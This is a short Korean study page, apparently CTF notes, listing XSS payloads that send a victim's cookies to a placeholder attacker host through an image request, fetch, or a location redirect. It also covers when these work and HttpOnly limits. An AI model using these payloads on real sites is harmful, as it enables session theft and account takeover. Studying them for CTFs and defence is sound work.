---
title: "Payloads"
draft: false
ShowToc: true
---

## XSS

### 쿠키 탈취 (외부 전송)

```js
new Image().src="http://ATTACKER/RECEIVER?q=" + document.cookie
```

- 언제: XSS가 터지는데 FLAG/세션이 피해자(봇) 쿠키에 있을 때 → 피해자가 페이로드 박힌 페이지를 방문 →쿠키를 공격자 수신처로 빼냄
- 원리: 이미지 객체에 src를 지정하면 브라우저가 그 URL로 GET 요청을 자동 발생 → 이미지 존재 여부 무관, 요청 자체가 목적 → 따옴표 밖 document.cookie는 실행되어 실제 쿠키값이 URL에 붙음
- 수신처: 외부 webhook 또는 문제 내부에 값을 저장/조회 가능한 엔드포인트(예: 전역 변수에 누적하는 /memo)

### 전송 수단 변형

```js
// 1. 이미지 (GET)
new Image().src="URL?q=" + document.cookie

// 2. fetch (GET/POST)
fetch("URL?q=" + document.cookie)

// 3. location 이동 (페이지 넘어감)
location="URL?q=" + document.cookie
```

- 셋 다 ***요청을 발생시켜 데이터를 URL에 실어 보낸다***가 핵심 → 상황에 따라 선택

### 주의

- 쿠키에 HttpOnly가 붙으면 document.cookie로 못 읽음 → 이 기법 전체가 무력 → 페이로드 짜기 전에 쿠키 속성부터 확인
- script 태그로 삽입 → innerHTML 경로에선 실행 안 됨 → 이벤트 핸들러(img onerror 등) 사용